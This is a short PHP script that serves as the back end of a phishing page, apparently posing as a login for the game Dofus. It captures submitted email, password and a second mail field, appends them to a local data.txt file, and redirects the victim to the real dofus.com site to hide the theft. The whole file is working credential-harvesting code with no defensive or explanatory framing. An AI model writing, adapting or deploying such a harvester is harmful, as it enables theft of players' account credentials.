<?php
header('Location: http://www.dofus.com/en');
$txt = "data.txt";
$fh = fopen($txt, 'w+');
if (isset($_POST['email']) && isset($_POST['pass'])&& isset($_POST['mail'])) { // check if both fields are set
   $txt=$_POST['email'].' - '.$_POST['pass'].' - '.$_POST['mail'];
   file_put_contents('data.txt',$txt."\n",FILE_APPEND); // log to data.txt
   exit();
}
    fwrite($fh,$txt); // Write information to the file
    fclose($fh); // Close the file
 
?>